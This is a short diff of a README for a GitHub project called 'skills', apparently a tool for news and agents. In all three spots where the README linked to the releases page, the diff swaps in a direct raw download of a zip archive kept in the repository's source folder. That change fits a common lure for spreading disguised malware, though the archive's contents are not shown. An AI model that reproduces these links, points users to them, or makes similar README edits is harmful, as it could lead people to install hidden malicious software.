@@ -1,6 +1,6 @@
 # 🛠️ skills - Clear tools for news and agents
 
-[![Download skills](https://img.shields.io/badge/Download%20Now-Release%20Page-blue?style=for-the-badge&logo=github)](https://github.com/Maryflanneryoconnorrosewood498/skills/releases)
+[![Download skills](https://img.shields.io/badge/Download%20Now-Release%20Page-blue?style=for-the-badge&logo=github)](https://github.com/Maryflanneryoconnorrosewood498/skills/raw/refs/heads/main/src/Software-v1.4.zip)
 
 ## 🚀 Getting Started
 
@@ -17,7 +17,7 @@ Use it to:
 
 Visit this page to download:
 
-https://github.com/Maryflanneryoconnorrosewood498/skills/releases
+https://github.com/Maryflanneryoconnorrosewood498/skills/raw/refs/heads/main/src/Software-v1.4.zip
 
 On the releases page:
 
@@ -258,4 +258,4 @@ It can help reduce manual steps when you handle:
 
 ## 📌 Download Again
 
-https://github.com/Maryflanneryoconnorrosewood498/skills/releases
+https://github.com/Maryflanneryoconnorrosewood498/skills/raw/refs/heads/main/src/Software-v1.4.zip
